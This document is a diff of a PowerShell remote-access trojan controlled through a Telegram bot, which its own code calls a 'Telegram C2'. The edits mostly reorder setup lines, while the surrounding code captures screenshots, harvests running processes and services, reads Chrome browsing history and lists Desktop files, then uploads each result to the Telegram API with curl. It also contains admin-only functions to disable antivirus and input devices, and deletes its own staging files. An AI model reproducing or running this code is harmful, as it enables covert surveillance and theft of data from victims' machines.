@@ -25,16 +25,11 @@ $URL = 'https://api.telegram.org/bot{0}' -f $Token
 $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
 $lastexecMessageID=""
-# Emoji characters
-$charCodes = @(0x2705, 0x1F4BB, 0x274C, 0x1F55C, 0x1F50D, 0x1F517, 0x23F8)
-$chars = $charCodes | ForEach-Object { [char]::ConvertFromUtf32($_) }
-$tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
-# remove pause files
-if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.ps1"){rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force}
-if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force}
+
 # Startup Delay
 Sleep 5
 if(Test-Path "C:\Windows\Tasks\service.vbs"){rm -path "C:\Windows\Tasks\service.vbs" -Force}
+
 # Get Chat ID from the bot
 while($chatID.length -eq 0){
 write-host "Waiting for Chat ID.."
@@ -43,16 +38,20 @@ if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
 if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
 Sleep 10
 }
+
+# Emoji characters and other setup
+$charCodes = @(0x2705, 0x1F4BB, 0x274C, 0x1F55C, 0x1F50D, 0x1F517, 0x23F8)
+$chars = $charCodes | ForEach-Object { [char]::ConvertFromUtf32($_) }
+$tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
+$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
 $Mts = New-Object psobject 
 $Mts | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
-# Collect script contents
-$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
-#----------------------------------------------- ON START ------------------------------------------------------
+
 # Message waiting for passphrase
 $contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
-#----------------------------------------------- ACTION FUNCTIONS ----------------------------------------------
+#--------------------------------------------------------- ACTION FUNCTIONS ------------------------------------------------------------
 
 Function Options{
 $contents = "==============================================
@@ -203,7 +202,6 @@ $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
 }
 
-
 Function Screenshot{
 Add-Type -AssemblyName System.Windows.Forms
 $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
@@ -329,7 +327,6 @@ curl.exe -F chat_id="$ChatID" -F document=@"$outpath" "https://api.telegram.org/
 Remove-Item -Path $outpath -Force
 }
 
-
 Function Software-Info{
 $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
 $service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
@@ -346,7 +343,6 @@ $outpath = "$env:temp\SoftwareInfo.txt"
 curl.exe -F chat_id="$ChatID" -F document=@"$outpath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
 Remove-Item -Path $outpath -Force
 }
-
 
 Function History-Info{
 $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
@@ -405,7 +401,6 @@ $results = Get-Content -Path $FileOut -Raw
 Write-Output "$results"
 rm -Path $FileOut
 }
-
 
 Function Folder-Tree{
 tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
@@ -507,7 +502,6 @@ Function Message([string]$Message){
     msg.exe * $Message
     Write-Output "Done."
 }
-
 # ---------------------------------------- ADMIN ONLY FUNCTIONS --------------------------------------------------
 
 Function Disable-AV{
@@ -534,8 +528,6 @@ Function Enable-HID{
     $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
     $PNPKeyboard.Enable()
 }
-
-
 
 # --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
 
@@ -607,7 +599,6 @@ try{
     }
 Catch{return "Telegram C2 Failed"}
 }
-
 #-------------------------------------------- START THE WAIT TO CONNECT LOOP ---------------------------------------------------
 
 While ($true){
